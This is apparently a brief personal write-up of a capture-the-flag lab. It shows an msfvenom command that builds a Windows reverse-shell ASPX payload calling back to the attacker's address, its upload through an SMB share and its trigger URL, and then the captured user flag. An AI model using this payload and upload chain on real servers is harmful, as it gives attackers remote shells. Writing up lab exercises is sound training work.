so it seems like the smb is used up in the website to serve the files 
so put a payload via smb and call from web ..

## exploit 
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 -f aspx -o shell.aspx `

![[Pasted image 20210529133102.png]]

upload and call the shell http://10.10.110.2:49663/nt4wrksv/shell.aspx

![[Pasted image 20210529133222.png]]


got user

![[Pasted image 20210529133350.png]]

user === THM{fdk4ka34vk346ksxfr21tg789ktf45}
